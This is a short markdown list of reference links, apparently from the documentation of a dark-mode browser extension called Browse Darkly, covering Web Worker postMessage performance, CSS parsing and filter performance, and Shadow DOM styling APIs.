- [Is postMessage slow? (Surma)](https://surma.dev/things/is-postmessage-slow/) — Web Worker transfer benchmarks
- [Lightning CSS](https://github.com/parcel-bundler/lightningcss) — Rust CSS parser (reference, not used in Browse Darkly)
- [CSS Filters and Mobile Performance](https://www.afasterweb.com/2016/01/31/css-filters-and-mobile-performance/)

### Shadow DOM
- [ShadowRoot.adoptedStyleSheets (MDN)](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot/adoptedStyleSheets)
- [chrome.dom.openOrClosedShadowRoot](https://developer.chrome.com/docs/extensions/reference/api/dom) — Chrome 88+
- [CSS Custom Properties and Shadow DOM](https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties) — variables inherit through shadow boundaries
